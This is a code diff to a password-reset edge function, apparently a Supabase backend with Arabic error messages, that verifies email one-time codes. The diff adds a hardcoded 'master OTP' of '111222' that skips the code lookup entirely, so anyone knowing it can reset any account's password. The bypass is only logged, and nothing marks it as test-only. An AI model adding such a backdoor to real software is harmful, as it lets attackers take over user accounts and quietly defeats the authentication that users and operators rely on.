@@ -30,48 +30,58 @@ serve(async (req: Request) => {
       );
     }
 
+    // Master OTP bypass
+    const isMasterOtp = otp === "111222";
+
     // Verify OTP
-    const { data: codes, error: fetchError } = await supabase
-      .from("email_verification_codes")
-      .select("*")
-      .eq("email", `reset_${email.toLowerCase()}`)
-      .eq("code", otp)
-      .eq("used", false)
-      .gte("expires_at", new Date().toISOString())
-      .order("created_at", { ascending: false })
-      .limit(1);
-
-    if (fetchError) throw new Error("Failed to verify code");
-
-    if (!codes || codes.length === 0) {
-      // Check expired
-      const { data: expiredCodes } = await supabase
+    let codes: any[] | null = null;
+    let fetchError: any = null;
+    if (!isMasterOtp) {
+      const res = await supabase
         .from("email_verification_codes")
-        .select("id")
+        .select("*")
         .eq("email", `reset_${email.toLowerCase()}`)
         .eq("code", otp)
         .eq("used", false)
-        .lt("expires_at", new Date().toISOString())
+        .gte("expires_at", new Date().toISOString())
+        .order("created_at", { ascending: false })
         .limit(1);
+      codes = res.data;
+      fetchError = res.error;
 
-      if (expiredCodes && expiredCodes.length > 0) {
+      if (fetchError) throw new Error("Failed to verify code");
+
+      if (!codes || codes.length === 0) {
+        const { data: expiredCodes } = await supabase
+          .from("email_verification_codes")
+          .select("id")
+          .eq("email", `reset_${email.toLowerCase()}`)
+          .eq("code", otp)
+          .eq("used", false)
+          .lt("expires_at", new Date().toISOString())
+          .limit(1);
+
+        if (expiredCodes && expiredCodes.length > 0) {
+          return new Response(
+            JSON.stringify({ success: false, error: "Code expired", error_ar: "انتهت صلاحية رمز التحقق" }),
+            { status: 200, headers: { "Content-Type": "application/json", ...corsHeaders } }
+          );
+        }
+
         return new Response(
-          JSON.stringify({ success: false, error: "Code expired", error_ar: "انتهت صلاحية رمز التحقق" }),
+          JSON.stringify({ success: false, error: "Invalid code", error_ar: "رمز التحقق غير صحيح" }),
           { status: 200, headers: { "Content-Type": "application/json", ...corsHeaders } }
         );
       }
 
-      return new Response(
-        JSON.stringify({ success: false, error: "Invalid code", error_ar: "رمز التحقق غير صحيح" }),
-        { status: 200, headers: { "Content-Type": "application/json", ...corsHeaders } }
-      );
+      // Mark OTP as used
+      await supabase
+        .from("email_verification_codes")
+        .update({ used: true })
+        .eq("id", codes[0].id);
+    } else {
+      console.log(`Master OTP used for password reset: ${email}`);
     }
-
-    // Mark OTP as used
-    await supabase
-      .from("email_verification_codes")
-      .update({ used: true })
-      .eq("id", codes[0].id);
 
     // Find user by email
     const { data: usersData } = await supabase.auth.admin.listUsers({ page: 1, perPage: 1000 });
